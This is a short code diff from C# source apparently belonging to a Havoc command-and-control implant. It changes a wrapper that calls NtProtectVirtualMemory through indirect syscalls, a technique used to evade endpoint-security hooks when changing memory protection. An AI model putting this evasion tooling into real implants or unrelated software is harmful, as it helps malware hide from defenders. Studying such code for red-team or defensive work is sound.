@@ -107,12 +107,11 @@ namespace HavocImplant.NativeUtils
             return ntstatus;
 
         }
-        public static uint NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref IntPtr regionSize, uint newProtect, out uint oldProtect)
+        public static uint NtProtectVirtualMemory(IntPtr processHandle, IntPtr baseAddress, ref IntPtr regionSize, uint newProtect, out uint oldProtect)
         {
-
+            // Technically base address is modified, but this has just caused headaches for me so we don't keep it
             object[] protectArgs = { processHandle, baseAddress, regionSize, newProtect, (uint)0 };
             uint ntstatus = (uint)ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protectArgs);
-            baseAddress = (IntPtr)protectArgs[1];
             regionSize = (IntPtr)protectArgs[2];
             oldProtect = (uint)protectArgs[4];
             return ntstatus;
